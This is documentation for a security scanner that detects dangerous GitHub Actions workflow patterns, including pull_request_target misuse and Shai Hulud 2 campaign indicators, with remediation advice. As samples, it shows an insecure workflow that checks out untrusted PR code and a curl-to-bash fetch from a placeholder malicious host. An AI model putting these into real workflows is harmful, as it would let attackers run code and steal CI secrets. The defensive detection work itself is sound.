# GitHub Actions Workflow Scanning

This document describes the GitHub Actions workflow security scanning capabilities of the GitHub IOC Scanner.

## Overview

The workflow scanner analyzes GitHub Actions workflow files (`.github/workflows/*.yml`) to detect dangerous configurations that could be exploited in supply chain attacks.

## Detected Patterns

### 1. Dangerous Triggers

#### pull_request_target Misconfiguration

**Severity: Critical**

The `pull_request_target` trigger runs with write permissions and access to secrets, even for pull requests from forks. This is dangerous when combined with checking out untrusted code.

**Insecure Example:**
```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # DANGEROUS: Checking out untrusted PR code with elevated permissions
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      
      # This runs untrusted code with access to secrets
      - run: npm install && npm test
```

**Secure Alternative:**
```yaml
on:
  pull_request:  # Use pull_request instead
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm install && npm test
```

#### workflow_run Privilege Escalation

**Severity: High**

The `workflow_run` trigger can be exploited to escalate privileges by accessing secrets from a completed workflow.

**Potentially Dangerous:**
```yaml
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      # Has access to secrets from the triggering workflow
      - run: echo "Deploying..."
```

**Recommendation:** Carefully validate the source workflow and limit secret access.

### 2. Malicious Self-Hosted Runners

#### SHA1HULUD Runner Detection

**Severity: Critical**

The Shai Hulud 2 attack campaign uses self-hosted runners with the identifier "SHA1HULUD" to execute malicious code.

**Malicious Pattern:**
```yaml
jobs:
  build:
    runs-on: SHA1HULUD  # Known malicious runner
    steps:
      - run: ./malicious-script.sh
```

#### Unknown Self-Hosted Runners

**Severity: Medium**

Any self-hosted runner should be reviewed to ensure it's legitimate infrastructure.

```yaml
jobs:
  build:
    runs-on: self-hosted  # Flagged for review
```

### 3. Shai Hulud 2 Attack Patterns

#### Malicious Workflow Files

**Severity: Critical**

The following workflow filenames are associated with the Shai Hulud 2 attack:

- `discussion.yaml` - Used for initial compromise
- `formatter_123456789.yml` - Obfuscated malicious workflow

**Detection:**
```
⚠️ CRITICAL: Suspicious workflow file detected
   File: .github/workflows/discussion.yaml
   Pattern: Shai Hulud 2 attack indicator
   Recommendation: Review workflow content and remove if unauthorized
```

#### Suspicious Script Execution

**Severity: High**

Workflows that execute obfuscated or suspicious scripts:

```yaml
steps:
  - run: |
      curl -s https://malicious.site/payload.sh | bash
      # Or base64 encoded commands
      echo "bWFsaWNpb3VzIGNvZGU=" | base64 -d | bash
```

## Usage

### Enable Workflow Scanning

Workflow scanning is enabled by default:

```bash
# Default behavior - workflows are scanned
github-ioc-scan --org your-org
```

### Disable Workflow Scanning

```bash
# Skip workflow analysis
github-ioc-scan --org your-org --no-scan-workflows
```

### Verbose Output

```bash
# See detailed workflow analysis
github-ioc-scan --org your-org --verbose
```

## Example Output

```
🔍 Scanning repository: your-org/web-app

📁 Workflow Analysis:
├── .github/workflows/ci.yml
│   └── ✅ No issues detected
├── .github/workflows/deploy.yml
│   └── ⚠️ HIGH: workflow_run trigger detected
│       └── Recommendation: Review secret access and validate source workflow
├── .github/workflows/pr-check.yml
│   └── 🚨 CRITICAL: pull_request_target with unsafe checkout
│       └── Line: 15
│       └── Recommendation: Use pull_request trigger or avoid checking out PR code

📈 Workflow Summary:
├── Workflows scanned: 3
├── Critical issues: 1
├── High issues: 1
├── Medium issues: 0
```

## Severity Levels

| Severity | Description | Action Required |
|----------|-------------|-----------------|
| **Critical** | Immediate security risk, likely exploitable | Immediate remediation |
| **High** | Significant security concern | Review and fix soon |
| **Medium** | Potential security issue | Review when possible |
| **Low** | Informational finding | Consider best practices |

## Remediation Recommendations

### pull_request_target Issues

1. **Use `pull_request` instead** when possible
2. **Never checkout PR code** with `pull_request_target`
3. **Use `workflow_run`** for two-stage workflows if secrets are needed
4. **Limit permissions** using the `permissions` key

```yaml
permissions:
  contents: read
  pull-requests: write
```

### Self-Hosted Runner Issues

1. **Audit all self-hosted runners** in your organization
2. **Use GitHub-hosted runners** when possible
3. **Implement runner groups** with restricted access
4. **Monitor runner activity** for suspicious behavior

### Suspicious Workflow Files

1. **Review workflow content** immediately
2. **Check commit history** for unauthorized changes
3. **Remove unauthorized workflows**
4. **Enable branch protection** for `.github/workflows/`

## Best Practices

### Workflow Security Checklist

- [ ] Use `pull_request` instead of `pull_request_target` when possible
- [ ] Never run untrusted code with elevated permissions
- [ ] Limit workflow permissions using the `permissions` key
- [ ] Use GitHub-hosted runners for sensitive operations
- [ ] Enable branch protection for workflow files
- [ ] Review workflow changes in pull requests
- [ ] Use CODEOWNERS for `.github/workflows/`

### Recommended Workflow Permissions

```yaml
# Minimal permissions for most workflows
permissions:
  contents: read

# For workflows that need to comment on PRs
permissions:
  contents: read
  pull-requests: write

# For release workflows
permissions:
  contents: write
  packages: write
```

## Related Documentation

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Secrets Detection](SECRETS_DETECTION.md) - Credential scanning
- [IOC Definitions](S1NGULARITY_IOC_SUMMARY.md) - Current IOC coverage
